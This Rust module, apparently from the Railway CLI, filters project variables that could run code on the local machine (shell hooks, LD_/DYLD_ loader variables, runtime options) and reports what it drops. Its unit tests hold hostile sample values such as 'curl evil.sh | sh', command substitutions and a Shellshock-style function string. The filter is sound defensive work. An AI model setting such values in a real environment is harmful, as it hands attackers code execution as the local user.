//! Filtering for variables that cross from a Railway project into a local
//! process.
//!
//! Service variables are writable by anyone with project MEMBER access, so from
//! the perspective of the machine running the CLI they are untrusted input. Most
//! are ordinary configuration, but a handful of names are read by the shell,
//! dynamic loader, or language runtime *during startup* and decide what code the
//! child executes. `PROMPT_COMMAND` runs before an interactive shell's first
//! prompt; `BASH_ENV` and `ENV` are expanded (so command substitution fires)
//! before a non-interactive shell runs anything. Passing those through means a
//! collaborator picks the command, and it runs as the local user.
//!
//! These names are dropped before any local spawn. They are still delivered to
//! deployed services normally — the boundary is only the local machine.

use std::collections::BTreeMap;

/// Names dropped on an exact (case-insensitive) match.
const UNSAFE_NAMES: &[&str] = &[
    // Shell startup and prompt hooks — execute their value directly.
    "PROMPT_COMMAND",
    "BASH_ENV",
    "ENV",
    "SHELLOPTS",
    "BASHOPTS",
    "PS1",
    "PS2",
    "PS4",
    "IFS",
    "CDPATH",
    "GLOBIGNORE",
    "ZDOTDIR",
    "FPATH",
    // Language runtime startup hooks.
    "NODE_OPTIONS",
    "NODE_REPL_EXTERNAL_MODULE",
    "PYTHONSTARTUP",
    "PYTHONPATH",
    "PYTHONHOME",
    "RUBYOPT",
    "RUBYLIB",
    "PERL5OPT",
    "PERL5LIB",
    "PERL5DB",
    // Tools that take a command in an environment variable.
    "GIT_SSH",
    "GIT_SSH_COMMAND",
    "GIT_EXTERNAL_DIFF",
    "GIT_PAGER",
    "GIT_EDITOR",
    "PAGER",
    "EDITOR",
    "VISUAL",
];

/// Names dropped on a (case-insensitive) prefix match. Covers the dynamic
/// loader families and exported shell functions, which are open-ended.
const UNSAFE_PREFIXES: &[&str] = &[
    "LD_",        // LD_PRELOAD, LD_AUDIT, LD_LIBRARY_PATH, ...
    "DYLD_",      // macOS equivalents
    "BASH_FUNC_", // exported shell functions
];

fn is_unsafe(name: &str) -> bool {
    // Compare bytes, not a string slice: `&name[..p.len()]` panics when the
    // prefix length lands inside a multi-byte character, and a variable name is
    // remote input.
    UNSAFE_NAMES.iter().any(|n| n.eq_ignore_ascii_case(name))
        || UNSAFE_PREFIXES.iter().any(|p| {
            name.len() >= p.len() && name.as_bytes()[..p.len()].eq_ignore_ascii_case(p.as_bytes())
        })
}

/// Removes variables that would let the remote value choose what the child
/// process executes. Returns the dropped names, sorted, so the caller can tell
/// the user what was withheld instead of silently losing a variable.
pub fn strip_unsafe_host_vars(variables: &mut BTreeMap<String, String>) -> Vec<String> {
    let dropped: Vec<String> = variables
        .keys()
        .filter(|name| is_unsafe(name))
        .cloned()
        .collect();

    for name in &dropped {
        variables.remove(name);
    }

    dropped
}

/// One-line notice for the dropped names. `None` when nothing was dropped.
pub fn dropped_notice(dropped: &[String]) -> Option<String> {
    if dropped.is_empty() {
        return None;
    }

    Some(format!(
        "Skipped {} service variable{} that can execute code in a local process: {}",
        dropped.len(),
        if dropped.len() == 1 { "" } else { "s" },
        dropped.join(", ")
    ))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn map(pairs: &[(&str, &str)]) -> BTreeMap<String, String> {
        pairs
            .iter()
            .map(|(k, v)| ((*k).to_string(), (*v).to_string()))
            .collect()
    }

    #[test]
    fn strips_shell_startup_hooks() {
        let mut vars = map(&[
            ("PROMPT_COMMAND", "curl evil.sh | sh"),
            ("BASH_ENV", "$(id > /tmp/pwned)"),
            ("ENV", "$(id)"),
            ("DATABASE_URL", "postgres://localhost/app"),
        ]);

        let dropped = strip_unsafe_host_vars(&mut vars);

        assert_eq!(dropped, vec!["BASH_ENV", "ENV", "PROMPT_COMMAND"]);
        assert_eq!(vars.len(), 1);
        assert!(vars.contains_key("DATABASE_URL"));
    }

    #[test]
    fn strips_loader_and_runtime_families() {
        let mut vars = map(&[
            ("LD_PRELOAD", "/tmp/x.so"),
            ("DYLD_INSERT_LIBRARIES", "/tmp/x.dylib"),
            ("BASH_FUNC_ls%%", "() { :; }; id"),
            ("NODE_OPTIONS", "--require /tmp/x.js"),
            ("PERL5OPT", "-Mevil"),
            ("PORT", "3000"),
        ]);

        let dropped = strip_unsafe_host_vars(&mut vars);

        assert_eq!(dropped.len(), 5);
        assert_eq!(vars.keys().collect::<Vec<_>>(), vec!["PORT"]);
    }

    #[test]
    fn matching_ignores_case() {
        let mut vars = map(&[("prompt_command", "id"), ("ld_preload", "/tmp/x.so")]);

        assert_eq!(strip_unsafe_host_vars(&mut vars).len(), 2);
        assert!(vars.is_empty());
    }

    #[test]
    fn a_multibyte_name_does_not_panic() {
        // The prefix check slices by byte length; a name whose second byte is
        // mid-character would panic on a string slice.
        let mut vars = map(&[
            ("L\u{00d0}_X", "v"),
            ("\u{00e9}", "v"),
            ("DYL\u{00d0}_X", "v"),
        ]);
        assert!(strip_unsafe_host_vars(&mut vars).is_empty());
        assert_eq!(vars.len(), 3);
    }

    #[test]
    fn leaves_ordinary_variables_alone() {
        let mut vars = map(&[
            ("DATABASE_URL", "postgres://localhost/app"),
            ("ENVIRONMENT", "production"),
            ("NODE_ENV", "production"),
            ("LDAP_URL", "ldap://example.com"),
            ("PATH_PREFIX", "/api"),
        ]);

        assert!(strip_unsafe_host_vars(&mut vars).is_empty());
        assert_eq!(vars.len(), 5);
    }

    #[test]
    fn notice_is_none_when_nothing_dropped() {
        assert!(dropped_notice(&[]).is_none());
        assert!(
            dropped_notice(&["BASH_ENV".to_string()])
                .unwrap()
                .contains("BASH_ENV")
        );
    }
}
